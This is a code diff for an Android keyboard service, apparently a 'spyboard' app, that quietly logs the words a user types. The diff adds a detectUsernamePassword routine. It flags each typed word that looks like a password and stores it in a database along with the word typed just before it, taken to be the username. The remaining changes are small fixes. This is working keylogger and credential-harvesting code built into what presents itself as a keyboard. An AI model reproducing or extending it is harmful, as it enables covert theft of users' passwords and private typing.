@@ -3,6 +3,7 @@ package com.idankorenisraeli.spyboard.input;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.EditorInfo;
@@ -35,6 +36,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     private static final int WORD_EST_LENGTH = 16; // size of new sb for better performance
     StringBuilder lastWordBuilder = new StringBuilder(WORD_EST_LENGTH); //Saving the last word user typed
+    String wordBefore; // For saving accounts username & password, the username will be the word before the password
 
     private DatabaseManager databaseManager;
 
@@ -192,8 +194,10 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
                 word = word.substring(1); //delete symbol before word
         }
 
-        if (word.length() > 0)
+        if (word.length() > 0) {
+            detectUsernamePassword(word);
             sessionUsageLog.addWord(word);
+        }
     }
 
     /**
@@ -202,9 +206,23 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
      * we will track the last word by the builder
      */
     private void trackWordByBuilder() {
-        if (lastWordBuilder.length() > 0)
-            sessionUsageLog.addWord(lastWordBuilder.toString());
+        if (lastWordBuilder.length() > 0) {
+            String lastWord = lastWordBuilder.toString();
+            detectUsernamePassword(lastWord);
+            sessionUsageLog.addWord(lastWord);
+            wordBefore = lastWord;
+        }
         lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
+    }
+
+    /**
+     * This method will look at the last wort that is written
+     * if it looks like a password, it will save the like-password and the word before
+     * (Which has a big chance to be a username) to the database
+     */
+    private void detectUsernamePassword(String lastWord){
+        if(dictionary.isPasswordLike(lastWord) && wordBefore!=null)
+            databaseManager.saveAccount(wordBefore, lastWord);
     }
 
     //endregion
@@ -279,7 +297,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
     /**
      * This method will calculate if there is a text before current ic
-     * It will help us calcualte a new word even though user did not press the spacebar
+     * It will help us calculate a new word even though user did not press the spacebar
      * because in messaging apps, like whatsapp, there is a 'send' key which is not a part of the keyboard
      * and there is still a new word there that needs to be tacked.
      *
@@ -287,7 +305,10 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
      */
     private boolean isTextBefore() {
         InputConnection ic = getCurrentInputConnection();
-        return ic.getTextBeforeCursor(1, 0).length() != 0;
+        CharSequence textBefore =ic.getTextBeforeCursor(1, 0);
+        if(textBefore==null)
+            return false;
+        return textBefore.length() != 0;
     }
 
 
@@ -330,7 +351,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         super.onFinishInputView(finishingInput);
 
         endInputSession();
-        Log.i("pttt", "Finish");
+        Log.i("pttt", "FinishInputView");
 
     }
 
